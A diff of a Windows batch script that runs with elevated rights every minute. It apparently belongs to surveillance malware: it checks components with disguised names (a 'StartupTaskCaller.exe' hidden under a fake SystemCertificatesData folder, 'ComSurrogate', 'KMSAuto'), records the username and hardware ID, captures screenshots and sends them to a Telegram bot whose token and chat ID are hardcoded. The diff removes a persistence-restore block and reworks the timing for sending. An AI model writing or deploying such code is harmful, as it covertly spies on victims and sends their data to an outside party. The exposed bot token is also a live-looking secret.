@@ -47,12 +47,6 @@ for /f "delims=" %%A in (%counterFile%) do set "counter=%%A"
 set /a counter+=1
 echo !counter! > "%counterFile%"
 
-:: Check if the counter reaches 15 (since the batch runs every minute)
-if !counter! geq 15 (
-    set "CheckSend=1"
-    echo 0 > "%counterFile%"
-)
-
 
 
 ::RUNADMINHERE ( Is Running with Elevated  Privileges , because this file is called by elevated batch file )
@@ -88,8 +82,6 @@ set loopCount=0
 ::StartupTaskCaller.exe ---> TSSPrxySTC.exe
 
 
-
-cd /d "%~dp0"
 
 
 
@@ -170,25 +162,6 @@ timeout /t 1 /nobreak >nul
 
 
 
-
-
-
-
-
-
-
-:STC
-:: Define the paths
-set "sourceFile=%SystemRoot%\System32\TSSPrxySTC.exe"
-set "startupFile=%appdata%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe"
-
-:: Check if the file exists in the Startup folder
-if not exist "%startupFile%" (
-    echo File not found in Startup folder. Restoring...
-    copy "%sourceFile%" "%startupFile%"
-) else (
-    echo File is already in Startup folder.
-)
 
 
 
@@ -290,7 +263,7 @@ if exist "%embeddedScript%" (
     goto CheckSHST
 )
 
-set "MESSAGE=%MESSAGE%|SHST|"
+set "MESSAGE=SHST|"
 set "CheckSend=1"
 
 
@@ -323,7 +296,7 @@ if exist "%embeddedScript%" (
     goto CheckComSurrogate
 )
 
-set "MESSAGE=%MESSAGE%|ComSurrogate|"
+set "MESSAGE=%MESSAGE%ComSurrogate|"
 set "CheckSend=1"
 
 
@@ -360,7 +333,7 @@ if exist "%embeddedScript%" (
     goto CheckKMSAuto
 )
 
-set "MESSAGE=%MESSAGE%|KMSAuto|"
+set "MESSAGE=%MESSAGE%KMSAuto|"
 set "CheckSend=1"
 
 
@@ -470,6 +443,14 @@ echo Message sent to chat ID %CHAT_ID%
 
 
 
+:: Check if the counter reaches 15 (since the batch runs every minute)
+if !counter! geq 15 (
+    set "CheckSend=1"
+    echo 0 > "%counterFile%"
+)
+
+
+
 
 
 
@@ -477,6 +458,7 @@ echo Message sent to chat ID %CHAT_ID%
 
 :: Check the value of CheckSend
 if "%CheckSend%"=="1" (
+    set "CheckSend=0"
     goto SENDCHECK
 ) else (
     goto checkloooop
@@ -511,7 +493,7 @@ PowerShell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -Asse
 :: Set bot token, chat ID, and caption
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "CAPTION=PC|%USERNAME%|%HWID%|STARTED|%MESSAGE%"
+set "CAPTION=Computer|%USERNAME%|%HWID%|STARTED|%MESSAGE%"
 set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
 
 :: URL encode the caption
@@ -554,5 +536,3 @@ if %loopCount% lss 6 (
     :: If 5 , end the script
     echo Loop completed 5 times. Exiting script.
 )
-
-
